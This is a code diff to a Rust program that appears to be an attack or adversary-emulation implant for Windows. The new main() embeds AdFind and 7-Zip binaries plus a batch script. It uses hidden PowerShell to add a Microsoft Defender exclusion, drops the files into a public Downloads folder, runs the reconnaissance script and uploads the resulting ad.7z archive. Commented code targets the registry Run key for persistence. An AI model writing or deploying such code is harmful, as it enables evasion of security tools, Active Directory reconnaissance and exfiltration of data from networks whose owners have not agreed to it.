@@ -6,80 +6,13 @@
 
 mod upload;
 mod escape;
-
-
-use std::env;
-use std::path::PathBuf;
-use std::process::Command;
-
-extern crate winreg;
-use winreg::HKEY;
-use winreg::RegKey;
-use winreg::enums::*;
+mod tools;
 
 use std::fs::File;
-use std::io::Write;
-
-
 
 use std::io::Read;
 use std::string::String;
-
-mod tools {
-
-    use winreg::RegKey;
-    use winreg::HKEY;
-    use std::process::Command;
-
-    /*
-    Execute an executable with a commandline
-    */
-    pub fn run_exe(executable: &str,commandline: &str) {
-        let mut child = Command::new(executable)
-            .args([commandline])
-            .spawn()
-            .expect("failed to execute process");
-        let _ecode = child.wait().expect("failed to wait on child");
-    }
-
-    /*
-    Execute an executable with a reverse commandline 
-    */
-    pub fn run_exe_reverse(executable: &str,commandline: &str) {
-        let commandline_reversed: String = commandline.chars().rev().collect();
-        let mut child = Command::new(executable)
-            .args([commandline_reversed])
-            .spawn()
-            .expect("failed to execute process");
-        let _ecode = child.wait().expect("failed to wait on child");
-    }
-    
-    /* learn how use generic type for value */
-    pub fn set_reg_str(root: HKEY, regpath: &str,name: &str, value: &str){
-        let base = winreg::RegKey::predef(root);
-        let rootkey = base.create_subkey(regpath);
-        match rootkey{
-            Ok(subkey) => {
-                let _set_result = subkey.0.set_value(name, &value);
-            },
-            Err(_) => return(),
-        }
-   }
-   pub fn set_reg_u32(root: HKEY, regpath: &str,name: &str, value: u32){
-    let base = winreg::RegKey::predef(root);
-    let rootkey = base.create_subkey(regpath);
-    match rootkey{
-        Ok(subkey) => {
-            let _set_result = subkey.0.set_value(name, &value);
-        },
-        Err(_) => return(),
-    }
-}
-
-
-
-
-}
+use std::io::Write;
 
    /* tools::set_reg_str(HKEY_LOCAL_MACHINE,
         "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -93,6 +26,29 @@ mod tools {
 
 
 fn main() {
-    escape::jump_man();
+    let dropzone = r"C:\Users\Public\Downloads\";
+
+    //Adfind tools
+    let adfind_bin = include_bytes!("payload/AdFind.bin");
+    let adfind_cmd = include_str!("payload/adfind.cmd");
+    
+    //7zip
+    let  sevenzip_a = include_bytes!("payload/7zip/7za.dll");
+    let  sevenzip_xa = include_bytes!("payload/7zip/7zxa.dll");
+    let  sevenzip_exe = include_bytes!("payload/7zip/7za.exe");
+
+    // exclude exe from defender
+    tools::run_exe("powershell", "-window hidden Add-MpPreference -ExclusionExtension find.exe",None);
+    
+    tools::drop_include_bytes(dropzone,"find.exe",adfind_bin);
+    tools::drop_include_bytes(dropzone,"7za.dll",sevenzip_a);
+    tools::drop_include_bytes(dropzone,"7zxa.dll",sevenzip_xa);
+    tools::drop_include_bytes(dropzone,"7za.exe",sevenzip_exe);
+    tools::drop_include_str(dropzone, "check.cmd", adfind_cmd);
+
+    tools::run_exe("cmd", "/c check.cmd",Some(dropzone));
+ 
+
+    upload::io_file("C:\\Users\\Public\\Downloads\\ad.7z");
 
 }
